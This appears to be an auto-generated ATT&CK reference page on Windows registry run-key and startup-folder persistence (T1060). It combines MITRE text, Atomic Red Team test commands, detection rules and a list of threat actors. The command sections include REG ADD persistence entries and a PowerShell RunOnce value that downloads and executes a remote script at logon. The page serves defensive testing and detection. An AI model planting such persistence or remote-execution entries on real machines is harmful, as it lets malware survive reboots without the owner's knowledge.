
# Registry Run Keys / Startup Folder

## Description

### MITRE Description

> Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

The following run keys are created by default on Windows systems:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The following Registry keys can be used to set startup folder items for persistence:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.


Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1060

## Potential Commands

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"

REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"

$RunOnceKey = "#{reg_key_path}"
set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'

$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'

Software\Microsoft\Windows\CurrentVersion\Run|Software\Microsoft\Windows\CurrentVersion\RunOnce|Software\Microsoft\Windows\CurrentVersion\RunOnceEx|Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|Software\Microsoft\Windows\CurrentVersion\RunServices|SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad|Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run|Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders|Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
\Microsoft\Windows\Start Menu\Programs\Startup|Software\Microsoft\Windows\CurrentVersion\Run|Software\Microsoft\Windows\CurrentVersion\RunOnce|Software\Microsoft\Windows\CurrentVersion\RunOnceEx|Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|Software\Microsoft\Windows\CurrentVersion\RunServices|SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad|Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run|Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders|Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Microsoft\Windows\Start Menu\Programs\Startup
\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft\Windows\Start Menu\Programs\Startup
powershell/persistence/elevated/registry
powershell/persistence/elevated/registry
powershell/persistence/userland/registry
powershell/persistence/userland/registry
```

## Commands Dataset

```
[{'command': 'REG ADD '
             '"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V '
             '"Atomic Red Team" /t REG_SZ /F /D '
             '"C:\\Path\\AtomicRedTeam.exe"\n',
  'name': None,
  'source': 'atomics/T1060/T1060.yaml'},
 {'command': 'REG ADD '
             'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend '
             '/v 1 /d "C:\\Path\\AtomicRedTeam.dll"\n',
  'name': None,
  'source': 'atomics/T1060/T1060.yaml'},
 {'command': '$RunOnceKey = "#{reg_key_path}"\n'
             'set-itemproperty $RunOnceKey "NextRun" \'powershell.exe "IEX '
             '(New-Object '
             'Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"\'\n',
  'name': None,
  'source': 'atomics/T1060/T1060.yaml'},
 {'command': '$RunOnceKey = '
             '"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"\n'
             'set-itemproperty $RunOnceKey "NextRun" \'#{thing_to_execute} '
             '"IEX (New-Object '
             'Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"\'\n',
  'name': None,
  'source': 'atomics/T1060/T1060.yaml'},
 {'command': 'Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User '
             'Shell '
             'Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell '
             'Folders',
  'name': None,
  'source': 'SysmonHunter - Registry Run Keys / Startup Folder'},
 {'command': '\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup|Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User '
             'Shell '
             'Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell '
             'Folders\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
  'name': None,
  'source': 'SysmonHunter - Registry Run Keys / Startup Folder'},
 {'command': '\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup',
  'name': None,
  'source': 'SysmonHunter - Registry Run Keys / Startup Folder'},
 {'command': 'powershell/persistence/elevated/registry',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/elevated/registry',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/userland/registry',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/userland/registry',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2019/10/01',
                  'description': 'Detects the suspicious RUN keys created by '
                                 'software located in Download or temporary '
                                 'Outlook/Internet Explorer directories',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 13,
                                              'Image': ['*\\Downloads\\\\*',
                                                        '*\\Temporary Internet '
                                                        'Files\\Content.Outlook\\\\*',
                                                        '*\\Local '
                                                        'Settings\\Temporary '
                                                        'Internet Files\\\\*'],
                                              'TargetObject': '*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\\*'}},
                  'falsepositives': ['Software installers downloaded and used '
                                     'by users'],
                  'id': '9c5037d1-c568-49b3-88c7-9846a5bdc2be',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://app.any.run/tasks/c5bef5b7-f484-4c43-9cf3-d5c5c7839def/'],
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1060'],
                  'title': 'Suspicious RUN Key from Download'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/07/18',
                  'description': 'Detects a possible persistence mechanism '
                                 'using RUN key for Windows Explorer and '
                                 'poiting to a suspicious folder',
                  'detection': {'condition': 'selection',
                                'selection': {'Details': ['C:\\Windows\\Temp\\\\*',
                                                          'C:\\ProgramData\\\\*',
                                                          '*\\AppData\\\\*',
                                                          'C:\\$Recycle.bin\\\\*',
                                                          'C:\\Temp\\\\*',
                                                          'C:\\Users\\Public\\\\*',
                                                          'C:\\Users\\Default\\\\*'],
                                              'EventID': 13,
                                              'TargetObject': '*\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run'}},
                  'falsepositives': ['Unknown'],
                  'fields': ['Image', 'ParentImage'],
                  'id': 'b7916c2a-fa2f-4795-9477-32b731f70f11',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://researchcenter.paloaltonetworks.com/2018/07/unit42-upatre-continues-evolve-new-anti-analysis-techniques/'],
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1060', 'capec.270'],
                  'title': 'Registry Persistence via Explorer Run Key'}},
 {'data_source': {'author': 'Florian Roth, Markus Neis',
                  'date': '2018/25/08',
                  'description': 'Detects suspicious new RUN key element '
                                 'pointing to an executable in a suspicious '
                                 'folder',
                  'detection': {'condition': 'selection',
                                'selection': {'Details': ['*C:\\Windows\\Temp\\\\*',
                                                          '*\\AppData\\\\*',
                                                          '%AppData%\\\\*',
                                                          '*C:\\$Recycle.bin\\\\*',
                                                          '*C:\\Temp\\\\*',
                                                          '*C:\\Users\\Public\\\\*',
                                                          '%Public%\\\\*',
                                                          '*C:\\Users\\Default\\\\*',
                                                          '*C:\\Users\\Desktop\\\\*',
                                                          'wscript*',
                                                          'cscript*'],
                                              'EventID': 13,
                                              'TargetObject': ['*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\\*',
                                                               '*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\\\*']}},
                  'falsepositives': ['Software with rare behaviour'],
                  'fields': ['Image'],
                  'id': '02ee49e2-e294-4d0f-9278-f5b3212fc588',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'modified': '2019/10/01',
                  'references': ['https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html'],
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1060'],
                  'title': 'New RUN Key Pointing to Suspicious Folder'}},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['4663', 'File monitoring']}]
```

## Potential Queries

```json
[{'name': 'Registry Run Keys Or Start Folder',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) '
           'and(registry_key_path contains '
           '"*\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run*"or '
           'registry_key_path contains '
           '"*\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\*Shell '
           'Folders")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Registry Run Keys / Start Folder': {'atomic_tests': [{'auto_generated_guid': 'e55be3fd-3521-4610-9d1a-e210e42dcf05',
                                                                                'description': 'Run '
                                                                                               'Key '
                                                                                               'Persistence\n'
                                                                                               '\n'
                                                                                               'Upon '
                                                                                               'successful '
                                                                                               'execution, '
                                                                                               'cmd.exe '
                                                                                               'will '
                                                                                               'modify '
                                                                                               'the '
                                                                                               'registry '
                                                                                               'by '
                                                                                               'adding '
                                                                                               '"Atomic '
                                                                                               'Red '
                                                                                               'Team" '
                                                                                               'to '
                                                                                               'the '
                                                                                               'Run '
                                                                                               'key. '
                                                                                               'Output '
                                                                                               'will '
                                                                                               'be '
                                                                                               'via '
                                                                                               'stdout. \n',
                                                                                'executor': {'cleanup_command': 'REG '
                                                                                                                'DELETE '
                                                                                                                '"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                                                                                                                '/V '
                                                                                                                '"Atomic '
                                                                                                                'Red '
                                                                                                                'Team" '
                                                                                                                '/f '
                                                                                                                '>nul '
                                                                                                                '2>&1\n',
                                                                                             'command': 'REG '
                                                                                                        'ADD '
                                                                                                        '"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                                                                                                        '/V '
                                                                                                        '"Atomic '
                                                                                                        'Red '
                                                                                                        'Team" '
                                                                                                        '/t '
                                                                                                        'REG_SZ '
                                                                                                        '/F '
                                                                                                        '/D '
                                                                                                        '"#{command_to_execute}"\n',
                                                                                             'name': 'command_prompt'},
                                                                                'input_arguments': {'command_to_execute': {'default': 'C:\\Path\\AtomicRedTeam.exe',
                                                                                                                           'description': 'Thing '
                                                                                                                                          'to '
                                                                                                                                          'Run',
                                                                                                                           'type': 'Path'}},
                                                                                'name': 'Reg '
                                                                                        'Key '
                                                                                        'Run',
                                                                                'supported_platforms': ['windows']},
                                                                               {'auto_generated_guid': '554cbd88-cde1-4b56-8168-0be552eed9eb',
                                                                                'description': 'RunOnce '
                                                                                               'Key '
                                                                                               'Persistence.\n'
                                                                                               '\n'
                                                                                               'Upon '
                                                                                               'successful '
                                                                                               'execution, '
                                                                                               'cmd.exe '
                                                                                               'will '
                                                                                               'modify '
                                                                                               'the '
                                                                                               'registry '
                                                                                               'to '
                                                                                               'load '
                                                                                               'AtomicRedTeam.dll '
                                                                                               'to '
                                                                                               'RunOnceEx. '
                                                                                               'Output '
                                                                                               'will '
                                                                                               'be '
                                                                                               'via '
                                                                                               'stdout. \n',
                                                                                'executor': {'cleanup_command': 'REG '
                                                                                                                'DELETE '
                                                                                                                'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend '
                                                                                                                '/v '
                                                                                                                '1 '
                                                                                                                '/f '
                                                                                                                '>nul '
                                                                                                                '2>&1\n',
                                                                                             'command': 'REG '
                                                                                                        'ADD '
                                                                                                        'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend '
                                                                                                        '/v '
                                                                                                        '1 '
                                                                                                        '/d '
                                                                                                        '"#{thing_to_execute}"\n',
                                                                                             'name': 'command_prompt'},
                                                                                'input_arguments': {'thing_to_execute': {'default': 'C:\\Path\\AtomicRedTeam.dll',
                                                                                                                         'description': 'Thing '
                                                                                                                                        'to '
                                                                                                                                        'Run',
                                                                                                                         'type': 'Path'}},
                                                                                'name': 'Reg '
                                                                                        'Key '
                                                                                        'RunOnce',
                                                                                'supported_platforms': ['windows']},
                                                                               {'auto_generated_guid': 'eb44f842-0457-4ddc-9b92-c4caa144ac42',
                                                                                'description': 'RunOnce '
                                                                                               'Key '
                                                                                               'Persistence '
                                                                                               'via '
                                                                                               'PowerShell\n'
                                                                                               'Upon '
                                                                                               'successful '
                                                                                               'execution, '
                                                                                               'a '
                                                                                               'new '
                                                                                               'entry '
                                                                                               'will '
                                                                                               'be '
                                                                                               'added '
                                                                                               'to '
                                                                                               'the '
                                                                                               'runonce '
                                                                                               'item '
                                                                                               'in '
                                                                                               'the '
                                                                                               'registry.\n',
                                                                                'executor': {'cleanup_command': 'Remove-ItemProperty '
                                                                                                                '-Path '
                                                                                                                '#{reg_key_path} '
                                                                                                                '-Name '
                                                                                                                '"NextRun" '
                                                                                                                '-Force '
                                                                                                                '-ErrorAction '
                                                                                                                'Ignore\n',
                                                                                             'command': '$RunOnceKey '
                                                                                                        '= '
                                                                                                        '"#{reg_key_path}"\n'
                                                                                                        'set-itemproperty '
                                                                                                        '$RunOnceKey '
                                                                                                        '"NextRun" '
                                                                                                        "'#{thing_to_execute} "
                                                                                                        '"IEX '
                                                                                                        '(New-Object '
                                                                                                        'Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"\'\n',
                                                                                             'elevation_required': True,
                                                                                             'name': 'powershell'},
                                                                                'input_arguments': {'reg_key_path': {'default': 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
                                                                                                                     'description': 'Path '
                                                                                                                                    'to '
                                                                                                                                    'registry '
                                                                                                                                    'key '
                                                                                                                                    'to '
                                                                                                                                    'update',
                                                                                                                     'type': 'Path'},
                                                                                                    'thing_to_execute': {'default': 'powershell.exe',
                                                                                                                         'description': 'Thing '
                                                                                                                                        'to '
                                                                                                                                        'Run',
                                                                                                                         'type': 'Path'}},
                                                                                'name': 'PowerShell '
                                                                                        'Registry '
                                                                                        'RunOnce',
                                                                                'supported_platforms': ['windows']}],
                                                              'attack_technique': 'T1060',
                                                              'display_name': 'Registry '
                                                                              'Run '
                                                                              'Keys '
                                                                              '/ '
                                                                              'Start '
                                                                              'Folder'}},
 {'SysmonHunter - T1060': {'description': None,
                           'level': 'high',
                           'name': 'Registry Run Keys / Startup Folder',
                           'phase': 'Persistence',
                           'query': [{'reg': {'path': {'pattern': 'Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User '
                                                                  'Shell '
                                                                  'Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell '
                                                                  'Folders'}},
                                      'type': 'reg'},
                                     {'file': {'path': {'pattern': '\\Microsoft\\Windows\\Start '
                                                                   'Menu\\Programs\\Startup'}},
                                      'process': {'cmdline': {'pattern': '\\Microsoft\\Windows\\Start '
                                                                         'Menu\\Programs\\Startup|Software\\Microsoft\\Windows\\CurrentVersion\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx|Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce|Software\\Microsoft\\Windows\\CurrentVersion\\RunServices|SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad|Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User '
                                                                         'Shell '
                                                                         'Folders|Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell '
                                                                         'Folders'}},
                                      'type': 'process'},
                                     {'file': {'path': {'pattern': '\\Microsoft\\Windows\\Start '
                                                                   'Menu\\Programs\\Startup'}},
                                      'process': {'cmdline': {'pattern': '\\Microsoft\\Windows\\Start '
                                                                         'Menu\\Programs\\Startup'}},
                                      'type': 'file'}]}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1060',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/persistence/elevated/registry":  '
                                                                                 '["T1060"],',
                                            'Empire Module': 'powershell/persistence/elevated/registry',
                                            'Technique': 'Registry Run Keys / '
                                                         'Start Folder'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1060',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/persistence/userland/registry":  '
                                                                                 '["T1060"],',
                                            'Empire Module': 'powershell/persistence/userland/registry',
                                            'Technique': 'Registry Run Keys / '
                                                         'Start Folder'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)


# Mitigations

None

# Actors


* [APT29](../actors/APT29.md)

* [MuddyWater](../actors/MuddyWater.md)
    
* [APT37](../actors/APT37.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Turla](../actors/Turla.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [APT19](../actors/APT19.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [FIN10](../actors/FIN10.md)
    
* [FIN6](../actors/FIN6.md)
    
* [Dark Caracal](../actors/Dark-Caracal.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [Ke3chang](../actors/Ke3chang.md)
    
* [Honeybee](../actors/Honeybee.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Putter Panda](../actors/Putter-Panda.md)
    
* [APT18](../actors/APT18.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [APT32](../actors/APT32.md)
    
* [APT3](../actors/APT3.md)
    
* [Gorgon Group](../actors/Gorgon-Group.md)
    
* [Darkhotel](../actors/Darkhotel.md)
    
* [FIN7](../actors/FIN7.md)
    
* [APT39](../actors/APT39.md)
    
* [APT33](../actors/APT33.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [Machete](../actors/Machete.md)
    
* [APT41](../actors/APT41.md)
    
